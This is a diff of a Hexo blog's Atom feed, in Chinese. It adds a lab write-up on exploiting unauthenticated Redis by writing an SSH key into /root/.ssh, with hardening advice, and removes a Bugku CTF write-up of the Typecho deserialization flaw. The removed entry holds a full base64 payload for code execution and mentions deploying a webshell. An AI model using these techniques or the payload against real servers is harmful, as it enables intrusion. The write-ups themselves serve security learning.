@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lzwgiter.github.io/"/>
-  <updated>2020-01-08T08:12:18.637Z</updated>
+  <updated>2020-01-09T12:27:48.434Z</updated>
   <id>http://lzwgiter.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Redis未授权访问漏洞及修补方法</title>
+    <link href="http://lzwgiter.github.io/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/"/>
+    <id>http://lzwgiter.github.io/Redis 未授权访问漏洞及修复方法/</id>
+    <published>2020-01-09T12:22:10.000Z</published>
+    <updated>2020-01-09T12:27:48.434Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>Redis</p></blockquote><a id="more"></a><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>  这个漏洞的主要原因是没有正确的配置Redis的配置文件，主要的错误配置有一下几点(redis.conf)：</p><ul><li><code>protected-mode no</code> 关闭了保护模式，允许外部的客户端使用redis-cli进行连接</li><li>将<code>bind 127.0.0.1</code> 注释掉，导致redis服务暴露在外部</li><li><p>没有设置密码</p><p>默认的Redis安装好后，默认是会bind 本地地址的，并开启了protected-mode，因为他的角色定位就是配合平常的数据库软件来使用的，是一种快速的缓存的键值型数据库，所以如果将它暴露在因特网上，并没有正确的配置就会有风险。</p></li></ul><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>  错误配置后，攻击者可以访问Redis服务，利用Redis自身提供的<code>config</code>命令进行写文件的操作，并将自己的SSH公钥写入目标服务器的/root/.ssh目录下，然后使用私钥直接登录目标服务器</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>  清单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机 ： kali 10.10.10.12</span><br><span class="line">靶机 ：CentOS7 10.10.10.11</span><br><span class="line">Redis版本： 3.2.0</span><br></pre></td></tr></table></figure><p>  下载好源码后编译，并修改redis.conf文件部分如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> IF YOU ARE SURE YOU WANT YOUR INSTANCE TO LISTEN TO ALL THE INTERFACES</span><br><span class="line"><span class="meta">#</span> JUST COMMENT THE FOLLOWING LINE.</span><br><span class="line"><span class="meta">#</span> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"><span class="meta">#</span> bind 127.0.0.1//此处将bind 127.0.0.1进行了注释</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> By default protected mode is enabled. You should disable it only if</span><br><span class="line"><span class="meta">#</span> you are sure you want clients from other hosts to connect to Redis</span><br><span class="line"><span class="meta">#</span> even if no authentication is configured, nor a specific set of interfaces</span><br><span class="line"><span class="meta">#</span> are explicitly listed using the "bind" directive.</span><br><span class="line">protected-mode no//修改为no</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>  使用src下的<code>redis-server</code>可执行文件 + 指定的配置文件运行Redis服务：</p><p><img src="/img/Redis未授权访问漏洞及修补方法/open-server.png" alt="open-server"></p><p><strong>攻击方法：在靶机的/root/.ssh/目录下写入自己ssh的公钥，使用自己的私钥直接登录对方的机器</strong></p><p>条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 靶机的Redis服务是使用root账号启动的</span><br><span class="line">2. 靶机开启了ssh服务，允许使用秘钥登录</span><br></pre></td></tr></table></figure><p> 在kali中生成自己的SSH公私钥对：</p><p><img src="/img/Redis未授权访问漏洞及修补方法/key-gen.png" alt="image-20200109192855717"></p><p>  登录到Redis服务，切换路径并写入公钥内容保存，退出</p><p><img src="/img/Redis未授权访问漏洞及修补方法/write_pub.png" alt="image-20200109194431365"></p><p>  直接使用私钥登录</p><p><img src="/img/Redis未授权访问漏洞及修补方法/logon.png" alt="image-20200109194551921"></p><p><strong>其他攻击方法：</strong></p><p>也可以向对方机器中写入一个crond任务，内容为反弹一个shell给自己或者向其web目录下写webshell，菜刀等直连即可</p><h3 id="修补方法"><a href="#修补方法" class="headerlink" title="修补方法"></a>修补方法</h3><ul><li>修改默认端口</li><li>设置密码认证</li><li>尽量以低权限来运行Redis服务</li><li>限制登录IP</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;
+&lt;p&gt;Redis&lt;/p&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://lzwgiter.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
   
   <entry>
     <title>本地提权与漏洞提权</title>
@@ -451,32 +473,6 @@
     
     
       <category term="渗透测试" scheme="http://lzwgiter.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>小明的博客--Typecho 反序列化漏洞</title>
-    <link href="http://lzwgiter.github.io/Typecho-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://lzwgiter.github.io/Typecho-反序列化漏洞/</id>
-    <published>2018-12-28T05:05:32.000Z</published>
-    <updated>2019-02-03T07:03:26.298Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>该漏洞是2017年10月份的Typecho前台代码执行漏洞，位于Typecho博客中的install.php中。该漏洞可以无限制执行代码，通过这种方式可以导致getshell。Bugku上面有该漏洞的练习题。题目地址:<a href="http://123.206.87.240:9003/" target="_blank" rel="noopener">http://123.206.87.240:9003/</a></p></blockquote><a id="more"></a><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>　　进入页面后为空白页，使用扫描器扫描存在的页面得结果：<br>　　<img src="/img/Typecho-反序列化漏洞/1.png" alt=""><br>　　后台存在三个页面：install.php，以及admin目录下两个页面：login.php和admin.php<br>　　login.php为404无法登陆，不存在后台，提示信息为Typecho，点击可以进入官方主页面，主要就是个轻量级的开源博客系统。<br>　　menu.php也没内容。。。估计是有人使坏删东西了。。。<br>　　搜索该博客系统的漏洞，有一个反序列化getshell的漏洞，github项目：<a href="https://github.com/BennyThink/Typecho_deserialization_exploit" target="_blank" rel="noopener">https://github.com/BennyThink/Typecho_deserialization_exploit</a><br>　　按照exp脚本：<br>　　<img src="/img/Typecho-反序列化漏洞/2.png" alt=""><br>　　部署b374k.php（一种很方便的webshell）后，进入页面，输入b374k就可以看到整个后台的目录了<br>　　<img src="/img/Typecho-反序列化漏洞/3.png" alt=""><br>　　找到f8l4a5g.txt，访问得flag:flag{typecho-bugku-get}</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>　　下面这段payload用于执行phpinfo()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUxMTc5NTIwMTtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=</span><br></pre></td></tr></table></figure></p><p>　　使用hackbar:<br>　　<img src="/img/Typecho-反序列化漏洞/4.png" alt=""></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;blockquote&gt;
-&lt;p&gt;该漏洞是2017年10月份的Typecho前台代码执行漏洞，位于Typecho博客中的install.php中。该漏洞可以无限制执行代码，通过这种方式可以导致getshell。Bugku上面有该漏洞的练习题。题目地址:&lt;a href=&quot;http://123.206.87.240:9003/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://123.206.87.240:9003/&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-    
-    </summary>
-    
-    
-      <category term="Bugku" scheme="http://lzwgiter.github.io/tags/Bugku/"/>
-    
-      <category term="渗透测试" scheme="http://lzwgiter.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="PHP" scheme="http://lzwgiter.github.io/tags/PHP/"/>
     
   </entry>
   
